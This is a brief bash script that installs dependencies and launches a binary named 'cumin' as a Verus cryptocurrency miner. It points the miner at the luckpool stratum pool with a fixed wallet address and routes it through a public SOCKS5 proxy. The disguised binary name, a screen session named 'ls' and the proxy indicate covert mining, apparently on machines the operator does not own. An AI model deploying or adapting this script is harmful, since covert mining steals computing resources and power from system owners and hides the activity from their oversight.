#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RW5Tf4U3xwdjufXZ1JXD8tm4hBoe5fkwKz
WORKER=$(echo $(shuf -i 1-100 -n 1)-RIIG)
PROXY=socks5://98.162.25.23:4145
./cumin -a verus -o $POOL -u $WALLET -p $WORKER -t 2 -x $PROXY